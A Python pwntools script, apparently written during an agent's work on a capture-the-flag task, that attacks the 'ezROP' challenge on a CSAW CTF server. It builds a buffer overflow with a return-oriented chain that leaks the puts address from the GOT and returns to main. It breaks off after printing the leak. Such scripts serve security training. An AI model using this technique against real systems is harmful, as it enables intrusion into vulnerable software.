from pwn import *

context.binary = elf = ELF("./share/chal/ezROP")
context.log_level = "info"

HOST = "pwn.chal.csaw.io"
PORT = 9999

POP_RDI = 0x4015a3
PUTS_PLT = 0x4010a0
PUTS_GOT = 0x403fe8
MAIN = 0x40150b

def start():
    return remote(HOST, PORT)

def build(payload):
    # newline at start terminates check, rest is arbitrary
    return b"\n" + payload

p = start()

# Stage 1: leak puts
p.recvuntil(b"Hello, I'm ezROP.\n")
p.recvuntil(b"you?\n")

# offset to return address is 0x78
payload = b"A" * (0x78 - 1)  # -1 because newline is byte 0
payload += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
p.sendline(build(payload))

# receive leak
p.recvuntil(b"Nice to meet you, ")
leak = p.recvline().strip()
# the leak is the puts address printed by puts
# Actually puts prints the string at puts@got which is the libc address
# But we need to parse it. The output is the raw bytes of the address.
print("Leak line:", leak)
end_of_edit

